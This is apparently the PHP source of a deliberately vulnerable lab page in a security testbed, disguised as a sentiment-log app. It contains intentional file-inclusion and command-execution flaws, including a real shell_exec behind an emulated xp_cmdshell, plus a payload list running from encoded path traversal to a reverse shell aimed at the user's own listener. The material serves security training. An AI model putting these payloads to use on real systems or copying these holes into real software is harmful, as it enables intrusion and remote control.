<?php
declare(strict_types=1);

/* -----------------------------
   1) Config & DB Connection
------------------------------*/
$db_host = 'db';
//$db_host = 'localhost';
$db_user = 'sa_user';
$db_pass = 'sa_password';
$db_name = 'crevice_db';
$smb_storage = __DIR__ . '/uploads/smb_share/';

if (!is_dir($smb_storage)) {
    mkdir($smb_storage, 0777, true);
}

$db_result = "";
$rows = [];
$result_columns = [];
$result_mode = 'message'; // 'table' or 'message'

/* --- Clear SMB Share Logic --- */
if (isset($_POST['clear_share'])) {
    $files = array_diff(scandir($smb_storage), ['.', '..']);
    foreach ($files as $file) {
        @unlink($smb_storage . $file);
    }
    $db_result = "Share cleared.";
}

$conn = null;

// If mysqli isn't available at all, don't fatal.
if (!class_exists('mysqli')) {
    $db_result = "DB connect failed: mysqli extension not available.";
} else {
    $tmp = @new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($tmp instanceof mysqli && $tmp->connect_errno) {
        $db_result = "DB connect failed: " . $tmp->connect_error;
        $conn = null;
    } else {
        $conn = $tmp;
    }
}

/* -----------------------------
   2) UI Payload Templates
------------------------------*/
$payload_templates = [
    [
        'title' => 'Phase 1: Local Traversal',
        'note'  => "\nBypass '..' filters with encoding to read system files like /etc/passwd.",
        'text'  => "..%252f..%252f..%252fetc/passwd",
    ],
    [
        'title' => 'Phase 1.2: Local Traversal',
        'note'  => "\nContinue adding ..%252f..%252f..%252f before etc/passwd until you see a sql error ",
        'text'  => "..%252f..%252f..%252fetc/passwd",
    ],
    [
        'title' => 'Phase 2: UNC Bypass',
        'note'  => "\nUse a UNC path to pull a query from your SMB share.",
        'text'  => "\\\\127.0.0.1\\share\\exploit.sql",
    ],
    [
        'title' => 'Phase 3a: Identity & Role Check',
        'note'  => "\nVerify your 'sa' status using MSSQL-specific functions.",
        'text'  => "SELECT SUSER_SNAME(); SELECT IS_SRVROLEMEMBER('sysadmin');",
    ],
    [
        'title' => 'Phase 3b: Verify RCE Config',
        'note'  => "\nCheck if the system administrator has enabled xp_cmdshell.",
        'text'  => "SELECT name, value, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';",
    ],
    [
        'title' => 'Phase 4: Remote Command Execution',
        'note'  => "\nLeverage xp_cmdshell to execute commands as the database service",
        'text'  => "EXEC xp_cmdshell 'id'",
    ],
    [
        'title' => 'Phase 5: RCE (Reverse Shell)',
        'note'  => "\nEstablish a connection back to your listener using: nc -lvnp 4444",
        'text'  => "EXEC xp_cmdshell 'php -r ''\$sock=fsockopen(\"<Your IP Address>\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'''",
    ],
];

/* -----------------------------
   3) SMB Emulation Logic
------------------------------*/
$upload_msg = "";
if (isset($_FILES['smb_file'])) {
    $file_name = $_FILES['smb_file']['name'];
    $tmp_name  = $_FILES['smb_file']['tmp_name'];

    $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime  = finfo_file($finfo, $tmp_name);
    finfo_close($finfo);

    $allowed_extensions = ['sql'];
    $allowed_mimes = ['text/plain', 'text/x-sql', 'application/sql'];

    if (!in_array($ext, $allowed_extensions, true)) {
        $upload_msg = "Error: Only .sql files are allowed.";
    } elseif (!in_array($mime, $allowed_mimes, true)) {
        $upload_msg = "Error: Invalid file content. Uploaded file must be a SQL script.";
    } else {
        $target_file = $smb_storage . basename($file_name);
        if (move_uploaded_file($tmp_name, $target_file)) {
            $upload_msg = "File uploaded to share: " . h($file_name);
        } else {
            $upload_msg = "Error: Upload failed.";
        }
    }

    $db_result = $upload_msg;
}

/* -----------------------------
   4) Core Vulnerability Logic
------------------------------*/
$filename = $_GET['filename'] ?? '';

if ($filename !== '') {
    if (strpos($filename, '../') !== false && strpos($filename, '\\\\') === false) {
        $db_result = "error during decoding";
    } else {
        $query_content = "";
        $file_read_success = false;

        if (preg_match('/^\\\\\\\\.+\\\\(.+\.(sql|txt|conf|passwd))$/i', $filename, $matches)) {
            $local_path = $smb_storage . $matches[1];
            if (file_exists($local_path)) {
                $query_content = file_get_contents($local_path);
                $file_read_success = true;
            } else {
                $db_result = "SMB Error: Network resource not found.";
            }
        } else {
            $decoded_path = urldecode($filename);

            $cleaned_path = ltrim($decoded_path, '/');
            if (strpos($cleaned_path, 'LFI/') === 0) {
                $cleaned_path = substr($cleaned_path, 4);
            }
            $final_path = __DIR__ . '/' . $cleaned_path;

            $query_content = @file_get_contents($final_path);
            if ($query_content !== false) {
                $file_read_success = true;
            } else {
                $db_result = "FS Error: Could not open handle to " . h($decoded_path);
            }
        }

        if ($file_read_success) {
            $content = trim($query_content);

            if (stripos($content, '@@version') !== false) {
    $db_result = "Microsoft SQL Server 2016 (SP2) - 13.0.5026.0 (X64)";
}
elseif (
    stripos($content, 'SUSER_SNAME()') !== false ||
    stripos($content, "IS_SRVROLEMEMBER('sysadmin')") !== false
) {
    $result_mode = 'table';
    $rows = [[
        'LoginName' => 'sa',
        'IsSysadmin' => 1,
    ]];
    $result_columns = array_keys($rows[0]);
    $db_result = "Returned Results";
}
elseif (
    stripos($content, 'sys.configurations') !== false &&
    stripos($content, 'xp_cmdshell') !== false
) {
    $result_mode = 'table';
    $rows = [[
        'name' => 'xp_cmdshell',
        'value' => 1,
        'value_in_use' => 1,
    ]];
    $result_columns = array_keys($rows[0]);
    $db_result = "Returned Results";
}
elseif (stripos($content, 'xp_cmdshell') !== false) {
    $re = "/(?:^|\\b)(?:exec(?:ute)?\\s+)?(?:master\\.\\.)?xp_cmdshell\\s+'((?:''|[^'])*)'/is";

    if (!preg_match($re, $content, $matches)) {
        $db_result = "Msg 102, Level 15, State 1, Line 1\nIncorrect syntax near 'xp_cmdshell'.";
    } else {
        $cmd = str_replace("''", "'", $matches[1]);
        $cmd = str_replace("\r", "", $cmd);
        $cmd = trim($cmd);

        $output = (string) shell_exec(
            "sudo -u mssql_svc bash -c " . escapeshellarg($cmd) . " 2>&1"
        );

        $db_result = trim($output) !== '' ? $output : "Command executed.";
    }
}
            else {
                try {
                    if (!$conn) {
                        $db_result = "DB connect failed: no active database connection.";
                    } else {
                        $res = $conn->query($content);

                        if ($res === true) {
                            $db_result = "Query executed.";
                        } elseif ($res instanceof mysqli_result) {
                            $rows = $res->fetch_all(MYSQLI_ASSOC);

                            if (empty($rows)) {
                                $db_result = "Query executed. 0 rows returned.";
                            } else {
                                $result_mode = 'table';
                                $result_columns = array_keys($rows[0]);
                                $db_result = "Returned Results";
                            }
                        } else {
                            $db_result = "Query executed.";
                        }
                    }
                } catch (mysqli_sql_exception $e) {
                    $db_result = "SQL Error: " . $e->getMessage();
                } catch (Throwable $e) {
                    $db_result = "SQL Error: " . $e->getMessage();
                }
            }
        } else {
            $db_result = "File read failed (or path not found).";
        }
    }
}

/* -----------------------------
   5) Normalize DB Engine Branding
------------------------------*/
if (isset($db_result) && is_string($db_result)) {
    $engineMap = [
        'MariaDB' => 'SQL Server',
        'MySQL'   => 'SQL Server',
    ];

    foreach ($engineMap as $from => $to) {
        if (stripos($db_result, $from) !== false) {
            $db_result = str_ireplace($from, $to, $db_result);
        }
    }

    $db_result = preg_replace_callback(
        "/near '([^']*)' at line (\\d+)/i",
        function ($matches) {
            $original = $matches[1];
            $snippet = mb_substr($original, 0, 2);
            if (mb_strlen($original) > 2) {
                $snippet .= " ...";
            }
            return "near '" . $snippet . "' at line " . $matches[2];
        },
        $db_result
    );
}

function h(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$should_auto_open = ($filename !== '') || isset($_FILES['smb_file']) || isset($_POST['clear_share']);
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>LFI + SQLi + RCE</title>
  <link rel="stylesheet" href="/shared/css/theme.css?asd3d12dfdddf">
  <link rel="stylesheet" href="/shared/css/header.css">
</head>
<body>
<div class="page-wrap">

  <a href="/" class="ctb-home">
    <div class="ctb-header headerpanel" role="banner">
      <div class="ctb-inner">
        <img class="ctb-shield" src="/shared/images/shield.png" alt="" aria-hidden="true" />
        <div class="ctb-text">
          <div class="ctb-title">
            <div class="crevice">CREVICE</div>
            <div class="testbed">TESTBED</div>
          </div>
        </div>
        <div class="ctb-tag">Exploit WebApp Vulnerabilities</div>
      </div>
    </div>
  </a>

  <div class="layout-row">
    <div class="app-container panel">
      <div class="header-row"><h2>Phishing Campaign Sentiment Log</h2></div>

      <div class="input-panel">
        <div class="panel">
          <h3>View User Sentiment Reports</h3>
          <div class="btn-row" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
            <a href="?filename=/LFI/queries/default/nicest.sql" style="text-decoration: none;">
              <button type="button" style="width: 100%; cursor: pointer;">😊 Nicest User</button>
            </a>
            <a href="?filename=/LFI/queries/default/encouraging.sql" style="text-decoration: none;">
              <button type="button" style="width: 100%; cursor: pointer;">🤝 Most Encouraging</button>
            </a>
            <a href="?filename=/LFI/queries/default/passive_aggressive.sql" style="text-decoration: none;">
              <button type="button" style="width: 100%; cursor: pointer;">🙄 Passive Aggressive</button>
            </a>
            <a href="?filename=/LFI/queries/default/overtly_aggressive.sql" style="text-decoration: none;">
              <button type="button" style="width: 100%; cursor: pointer;">👊 Overtly Aggressive</button>
            </a>
            <a href="?filename=/LFI/queries/default/full_report.sql" style="text-decoration: none; grid-column: span 2;">
              <button type="button" style="width: 100%; cursor: pointer; background-color: #28a745; color: white;">📄 View Full Sentiment Log</button>
            </a>
          </div>
        </div>

        <div class="panel">
          <h3>Your Mock SMB Share (\\127.0.0.1\share\)</h3>
          <?php if ($upload_msg): ?>
            <p style="color: black; font-weight: bold;"><?= h($upload_msg) ?></p>
          <?php endif; ?>

          <form method="POST" enctype="multipart/form-data">
            <input type="file" name="smb_file" accept=".sql" required>
            <button type="submit" style="margin-top:10px;">Upload to Share</button>
          </form>

          <div class="input-panel" style="margin-top: 10px; width:97%;">
            <strong>Files on Share:</strong>
            <ul>
              <?php foreach (array_diff(scandir($smb_storage), ['.', '..']) as $file): ?>
                <li><?= h($file) ?></li>
              <?php endforeach; ?>
            </ul>
          </div>

          <form method="POST" style="margin-top:10px;">
            <button type="submit" name="clear_share" class="btn-danger" onclick="return confirm('Clear all?');">Clear All Files</button>
          </form>
        </div>


      </div>
    </div>

    <div class="payloads-container panel">
      <div class="header-row">
        <h2>Example Payloads</h2>
        <button type="button" id="toggleAllPayloads">Show all</button>
      </div>
      <div class="input-panel">
        <?php foreach ($payload_templates as $idx => $p): ?>
          <div class="payload-block">
            <div class="payload-body" id="payload-<?= $idx ?>" style="display:none;">
              <p><strong><?= h($p['title']) ?>:</strong> <?= nl2br(h($p['note'])) ?></p>
              <pre><?= h($p['text']) ?></pre>
            </div>
          </div>
        <?php endforeach; ?>
      </div>
    </div>

    <div class="text-container">
      <div class="input-panel textborder">
        Demonstration of Local File Inclusion (LFI) through insecure path normalization and UNC path inclusion. Simulates legacy Windows Server canonicalization behavior and a misconfigured MSSQL environment.
      </div>
    </div>
  </div>

  <a class="whitetext" href="/" style="padding:20px; display:block;">Home</a>
</div>

<div id="resultsPopover"
     class="popover-backdrop"
     aria-hidden="true"
     data-auto-open="<?= $should_auto_open ? '1' : '0' ?>">
  <div class="popover-panel panel" role="dialog" aria-modal="true" aria-labelledby="popoverResultsTitle">
    <div class="input-panel">
      <div class="popover-header">
        <h2 id="popoverResultsTitle" class="whitetext">Returned Results</h2>
        <div class="popover-header-actions">
          <button type="button" id="closeResultsPopoverTop" class="popover-close-x" aria-label="Close results viewer">&times;</button>
        </div>
      </div>

      <div class="popover-body">
        <div id="popoverResultsMeta" class="whitetext popover-meta">
          <?= $result_mode === 'table' ? count($rows) . ' row(s) returned' : 'Database / file include output' ?>
        </div>

        <div id="popoverResultsContainer" class="table-wrap results-scroll"></div>

        <div class="results-launch-row" style="margin-top:16px;">
          <button type="button" id="closeResultsPopoverBottom">Close</button>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
var LfiResultOptions = {
  mode: <?= json_encode($result_mode, JSON_UNESCAPED_UNICODE) ?>,
  columns: <?= json_encode($result_columns, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE) ?>,
  rows: <?= json_encode($rows, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE) ?>,
  message: <?= json_encode($db_result ?: "Awaiting input...", JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE) ?>,
  title: <?= json_encode($result_mode === 'table' ? 'Returned Results' : 'System Response', JSON_UNESCAPED_UNICODE) ?>
};
</script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  var popover = document.getElementById('resultsPopover');
  var closeTop = document.getElementById('closeResultsPopoverTop');
  var closeBottom = document.getElementById('closeResultsPopoverBottom');
  var popoverTitleEl = document.getElementById('popoverResultsTitle');
  var popoverMetaEl = document.getElementById('popoverResultsMeta');
  var popoverContainer = document.getElementById('popoverResultsContainer');

  function escapeHtml(value) {
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function buildResultsTable(options) {
    var rows = Array.isArray(options.rows) ? options.rows : [];
    var columns = Array.isArray(options.columns) && options.columns.length
      ? options.columns
      : (rows.length ? Object.keys(rows[0]) : []);

    if (!rows.length) {
      return '<div class="results-empty">No results found.</div>';
    }

    var html = '<table class="results-table"><thead><tr>';

    for (var i = 0; i < columns.length; i++) {
      html += '<th>' + escapeHtml(columns[i]) + '</th>';
    }

    html += '</tr></thead><tbody>';

    for (var r = 0; r < rows.length; r++) {
      html += '<tr>';
      for (var c = 0; c < columns.length; c++) {
        var key = columns[c];
        var cell = rows[r][key] == null ? '' : rows[r][key];
        html += '<td>' + escapeHtml(cell) + '</td>';
      }
      html += '</tr>';
    }

    html += '</tbody></table>';
    return html;
  }

  function buildMessageBlock(message) {
    return '<pre class="results-message">' + escapeHtml(message) + '</pre>';
  }

  function renderResults() {
    if (!popoverContainer || typeof LfiResultOptions === 'undefined') return;

    if (popoverTitleEl) {
      popoverTitleEl.textContent = LfiResultOptions.title || 'System Response';
    }

    if (LfiResultOptions.mode === 'table') {
      if (popoverMetaEl) {
        popoverMetaEl.textContent = (LfiResultOptions.rows || []).length + ' row(s) returned';
      }
      popoverContainer.innerHTML = buildResultsTable(LfiResultOptions);
    } else {
      if (popoverMetaEl) {
        popoverMetaEl.textContent = 'Database / file include output';
      }
      popoverContainer.innerHTML = buildMessageBlock(
        LfiResultOptions.message || 'Awaiting input...'
      );
    }
  }

  function openPopover() {
    if (!popover) return;
    popover.classList.add('is-open');
    popover.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';

    if (popoverContainer) {
      popoverContainer.scrollTop = 0;
    }
  }

  function closePopover() {
    if (!popover) return;
    popover.classList.remove('is-open');
    popover.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  renderResults();

  if (closeTop) closeTop.addEventListener('click', closePopover);
  if (closeBottom) closeBottom.addEventListener('click', closePopover);

  if (popover) {
    popover.addEventListener('click', function (event) {
      if (event.target === popover) closePopover();
    });

    if (popover.dataset.autoOpen === '1') {
      openPopover();
    }
  }

  document.addEventListener('keydown', function (event) {
    if (event.key === 'Escape' && popover && popover.classList.contains('is-open')) {
      closePopover();
    }
  });
});
</script>

<script src="/shared/scripts/payloadsButton.js"></script>
</body>
</html>